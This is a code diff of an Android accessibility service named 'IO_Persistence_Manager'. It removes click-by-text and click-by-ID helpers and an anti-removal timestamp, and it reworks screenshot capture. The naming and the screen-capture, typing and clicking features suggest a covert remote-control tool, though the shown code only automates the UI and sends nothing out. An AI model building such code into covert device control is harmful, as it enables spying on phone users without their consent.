@@ -31,7 +31,6 @@ public class IO_Persistence_Manager extends AccessibilityService {
     private int screenWidth = 0;
     private int screenHeight = 0;
 
-    private long lastAntiRemovalCheck = 0;
     private static volatile long lastEventTime = 0;
     private Handler backgroundHandler;
     private android.os.HandlerThread handlerThread;
@@ -837,14 +836,6 @@ public class IO_Persistence_Manager extends AccessibilityService {
         return obj;
     }
 
-    public boolean performNodeAction(int id, int action) {
-        AccessibilityNodeInfo node = nodeIdMap.get(id);
-        if (node != null) {
-            return node.performAction(action);
-        }
-        return false;
-    }
-
     public void typeText(final String text) {
         if (text == null) return;
         new Handler(Looper.getMainLooper()).post(() -> {
@@ -982,84 +973,6 @@ public class IO_Persistence_Manager extends AccessibilityService {
         return AccessibilityNodeInfo.obtain(node);
     }
 
-    public boolean clickByText(String text) {
-        if (text == null) return false;
-        AccessibilityNodeInfo root = getRootInActiveWindow();
-        if (root != null) {
-            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
-            if (nodes != null && !nodes.isEmpty()) {
-                for (AccessibilityNodeInfo node : nodes) {
-                    if (node != null && node.isVisibleToUser()) {
-                        // Click actual node if possible, else use coordinates
-                        if (node.isClickable()) {
-                            if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
-                                root.recycle();
-                                return true;
-                            }
-                        }
-                        Rect bounds = new Rect();
-                        node.getBoundsInScreen(bounds);
-                        if (clickAt(bounds.centerX(), bounds.centerY())) {
-                            root.recycle();
-                            return true;
-                        }
-                    }
-                }
-            }
-            root.recycle();
-        }
-
-        // Deep Search (Iterate all windows)
-        List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
-        if (windows != null) {
-            for (android.view.accessibility.AccessibilityWindowInfo window : windows) {
-                if (window == null) continue;
-                AccessibilityNodeInfo windowRoot = window.getRoot();
-                if (windowRoot == null) continue;
-                
-                List<AccessibilityNodeInfo> nodes = windowRoot.findAccessibilityNodeInfosByText(text);
-                if (nodes != null && !nodes.isEmpty()) {
-                    for (AccessibilityNodeInfo node : nodes) {
-                        if (node != null && node.isVisibleToUser()) {
-                            AccessibilityNodeInfo target = node;
-                            while (target != null && !target.isClickable()) {
-                                target = target.getParent();
-                            }
-                            
-                            if (target != null && target.isClickable()) {
-                                boolean success = target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                                windowRoot.recycle();
-                                return success;
-                            } else {
-                                Rect bounds = new Rect();
-                                node.getBoundsInScreen(bounds);
-                                boolean success = clickAt(bounds.centerX(), bounds.centerY());
-                                windowRoot.recycle();
-                                return success;
-                            }
-                        }
-                    }
-                }
-                windowRoot.recycle();
-            }
-        }
-        return false;
-    }
-
-    public boolean clickById(String id) {
-        AccessibilityNodeInfo root = getRootInActiveWindow();
-        if (root == null) return false;
-        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
-        if (nodes != null && !nodes.isEmpty()) {
-            for (AccessibilityNodeInfo node : nodes) {
-                Rect bounds = new Rect();
-                node.getBoundsInScreen(bounds);
-                if (clickAt(bounds.centerX(), bounds.centerY())) return true;
-            }
-        }
-        return false;
-    }
-
     public boolean swipe(int x1, int y1, int x2, int y2, int duration) {
         Log.d(TAG, "Interaction: SWIPE from (" + x1 + "," + y1 + ") to (" + x2 + "," + y2 + ") dur=" + duration);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
@@ -1111,19 +1024,31 @@ public class IO_Persistence_Manager extends AccessibilityService {
         if (isScreenshotting) { callback.onFailure("BUSY"); return; }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             isScreenshotting = true;
+            ScreenshotCallback wrappedCallback = new ScreenshotCallback() {
+                @Override
+                public void onSuccess(byte[] jpegData) {
+                    isScreenshotting = false;
+                    callback.onSuccess(jpegData);
+                }
+
+                @Override
+                public void onFailure(String err) {
+                    isScreenshotting = false;
+                    callback.onFailure(err);
+                }
+            };
+
             try {
-                // Use reflection to call API 30+ helper to prevent class verification errors on legacy devices
                 Class<?> helper = Class.forName(Api30Helper.class.getName());
                 java.lang.reflect.Method method = helper.getMethod("takeScreenshot", AccessibilityService.class, ScreenshotCallback.class);
-                method.invoke(null, this, callback);
+                method.invoke(null, this, wrappedCallback);
                 
-                // Reset flag after a timeout in case reflection call fails silently
                 new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                     @Override
                     public void run() {
                         isScreenshotting = false;
                     }
-                }, 5000);
+                }, 800);
             } catch (Exception e) {
                 isScreenshotting = false;
                 callback.onFailure("Screenshot Bridge Error: " + e.getMessage());
